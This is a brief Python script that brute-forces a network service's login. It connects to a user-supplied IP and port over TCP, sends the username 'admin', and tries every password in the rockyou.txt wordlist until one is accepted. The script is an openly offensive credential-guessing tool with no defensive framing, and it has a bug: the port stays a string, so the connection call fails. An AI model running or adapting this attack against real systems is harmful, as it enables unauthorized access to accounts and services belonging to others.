import socket

# Setting up the target
host = input("Enter the ip address: ")
port = input("Enter the port: ")

# Setting up the wordlist for fuzzing
wordlist = "rockyou.txt"

# Set up the request to the endpoint
def fuzz_password(wordlist_file):
  try:
    # Open the wordlist file
    with open(wordlist_file, 'r') as file:
      for line in file:
        # clean up the new lines and spaces
        command = line.strip()

        # Establish connection to the server
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
          s.connect((host, port))
          # Send the fuzzing command
          s.sendall(b'admin\n')
          # Receive the response from the server
          response = s.recv(1024).decode().strip()

          if "password" in response:
            s.sendall((command + '\n').encode())

            # Response of server after entering password
            response = s.recv(1024).decode().strip()
            if "password" in response:
              continue
            else:
              print("The password is: ",command)
              break
      else:
        print("No valid password found in the wordlist.")
  except FileNotFoundError:
    print("File not found. Please check the wordlist path.")
  except Exception as e:
    print(f"An error occurred: {e}")
  
# Run the fuzzing function with the wordlist
fuzz_password(wordlist)